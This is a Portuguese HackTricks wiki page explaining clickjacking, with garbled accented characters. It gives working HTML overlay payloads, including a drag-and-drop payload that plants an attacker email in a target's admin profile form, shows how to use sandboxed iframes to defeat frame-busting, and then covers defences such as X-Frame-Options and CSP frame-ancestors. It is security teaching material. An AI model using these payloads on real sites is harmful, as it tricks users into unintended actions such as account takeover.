# Clickjacking

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## O que √© Clickjacking

Em um ataque de clickjacking, um **usu√°rio** √© **enganado** a **clicar** em um **elemento** em uma p√°gina da web que √© **invis√≠vel** ou disfar√ßado como um elemento diferente. Essa manipula√ß√£o pode levar a consequ√™ncias indesejadas para o usu√°rio, como o download de malware, redirecionamento para p√°ginas web maliciosas, fornecimento de credenciais ou informa√ß√µes sens√≠veis, transfer√™ncias de dinheiro ou a compra online de produtos.

### Truque de pr√©-preenchimento de formul√°rios

√Äs vezes, √© poss√≠vel **preencher o valor dos campos de um formul√°rio usando par√¢metros GET ao carregar uma p√°gina**. Um atacante pode abusar desse comportamento para preencher um formul√°rio com dados arbitr√°rios e enviar a carga √∫til de clickjacking para que o usu√°rio pressione o bot√£o Enviar.

### Preencher formul√°rio com Arrastar&Soltar

Se voc√™ precisa que o usu√°rio **preencha um formul√°rio**, mas n√£o quer pedir diretamente que ele escreva algumas informa√ß√µes espec√≠ficas (como o e-mail e ou senha espec√≠fica que voc√™ conhece), voc√™ pode apenas pedir que ele **Arraste&Solte** algo que escrever√° seus dados controlados, como neste [**exemplo**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Carga √ötil B√°sica
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload de M√∫ltiplas Etapas
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se voc√™ identificou um **ataque XSS que requer que um usu√°rio clique** em algum elemento para **disparar** o XSS e a p√°gina √© **vulner√°vel a clickjacking**, voc√™ pode abusar disso para enganar o usu√°rio a clicar no bot√£o/link.\
Exemplo:\
_Voc√™ encontrou um **self XSS** em alguns detalhes privados da conta (detalhes que **apenas voc√™ pode definir e ler**). A p√°gina com o **formul√°rio** para definir esses detalhes √© **vulner√°vel** a **Clickjacking** e voc√™ pode **preencher** o **formul√°rio** com os par√¢metros GET._\
\_\_Um atacante poderia preparar um ataque de **Clickjacking** para essa p√°gina **preenchendo** o **formul√°rio** com a **carga √∫til XSS** e **enganando** o **usu√°rio** a **enviar** o formul√°rio. Assim, **quando o formul√°rio √© enviado** e os valores s√£o modificados, o **usu√°rio executar√° o XSS**.

## Estrat√©gias para Mitigar Clickjacking

### Defesas do Lado do Cliente

Scripts executados no lado do cliente podem realizar a√ß√µes para prevenir Clickjacking:

* Garantir que a janela da aplica√ß√£o seja a principal ou a janela superior.
* Tornar todos os frames vis√≠veis.
* Prevenir cliques em frames invis√≠veis.
* Detectar e alertar os usu√°rios sobre poss√≠veis tentativas de Clickjacking.

No entanto, esses scripts de quebra de frame podem ser contornados:

* **Configura√ß√µes de Seguran√ßa dos Navegadores:** Alguns navegadores podem bloquear esses scripts com base em suas configura√ß√µes de seguran√ßa ou falta de suporte a JavaScript.
* **Atributo `sandbox` do iframe HTML5:** Um atacante pode neutralizar scripts de quebra de frame definindo o atributo `sandbox` com valores `allow-forms` ou `allow-scripts` sem `allow-top-navigation`. Isso impede que o iframe verifique se √© a janela superior, e.g.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` e `allow-scripts` valores permitem a√ß√µes dentro do iframe enquanto desabilitam a navega√ß√£o de n√≠vel superior. Para garantir a funcionalidade pretendida do site alvo, permiss√µes adicionais como `allow-same-origin` e `allow-modals` podem ser necess√°rias, dependendo do tipo de ataque. Mensagens do console do navegador podem guiar quais permiss√µes permitir.

### Defesas do Lado do Servidor

#### X-Frame-Options

O **cabe√ßalho de resposta HTTP `X-Frame-Options`** informa aos navegadores sobre a legitimidade de renderizar uma p√°gina em um `<frame>` ou `<iframe>`, ajudando a prevenir Clickjacking:

* `X-Frame-Options: deny` - Nenhum dom√≠nio pode emoldurar o conte√∫do.
* `X-Frame-Options: sameorigin` - Somente o site atual pode emoldurar o conte√∫do.
* `X-Frame-Options: allow-from https://trusted.com` - Somente o 'uri' especificado pode emoldurar a p√°gina.
* Note as limita√ß√µes: se o navegador n√£o suportar esta diretiva, pode n√£o funcionar. Alguns navegadores preferem a diretiva CSP frame-ancestors.

#### Diretiva frame-ancestors da Content Security Policy (CSP)

A **diretiva `frame-ancestors` na CSP** √© o m√©todo recomendado para prote√ß√£o contra Clickjacking:

* `frame-ancestors 'none'` - Semelhante a `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Semelhante a `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Semelhante a `X-Frame-Options: allow-from`.

Por exemplo, a seguinte CSP permite apenas emoldurar do mesmo dom√≠nio:

`Content-Security-Policy: frame-ancestors 'self';`

Mais detalhes e exemplos complexos podem ser encontrados na [documenta√ß√£o frame-ancestors CSP](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) e na [documenta√ß√£o frame-ancestors da Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) com `child-src` e `frame-src`

A **Content Security Policy (CSP)** √© uma medida de seguran√ßa que ajuda a prevenir Clickjacking e outros ataques de inje√ß√£o de c√≥digo, especificando quais fontes o navegador deve permitir para carregar conte√∫do.

#### Diretiva `frame-src`

* Define fontes v√°lidas para frames.
* Mais espec√≠fica do que a diretiva `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Esta pol√≠tica permite frames da mesma origem (self) e https://trusted-website.com.

#### Diretriz `child-src`

* Introduzida no n√≠vel 2 do CSP para definir fontes v√°lidas para web workers e frames.
* Funciona como um fallback para frame-src e worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Esta pol√≠tica permite frames e workers da mesma origem (self) e https://trusted-website.com.

**Notas de Uso:**

* Deprecia√ß√£o: child-src est√° sendo descontinuado em favor de frame-src e worker-src.
* Comportamento de Fallback: Se frame-src estiver ausente, child-src √© usado como um fallback para frames. Se ambos estiverem ausentes, default-src √© usado.
* Defini√ß√£o Estrita de Fonte: Inclua apenas fontes confi√°veis nas diretrizes para evitar explora√ß√£o.

#### Scripts de Quebra de Frame em JavaScript

Embora n√£o sejam completamente infal√≠veis, scripts de quebra de frame baseados em JavaScript podem ser usados para evitar que uma p√°gina da web seja emoldurada. Exemplo:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Empregando Tokens Anti-CSRF

* **Valida√ß√£o de Token:** Use tokens anti-CSRF em aplica√ß√µes web para garantir que solicita√ß√µes que alteram o estado sejam feitas intencionalmente pelo usu√°rio e n√£o atrav√©s de uma p√°gina Clickjacked.

## Refer√™ncias

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** comunit√°rias **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
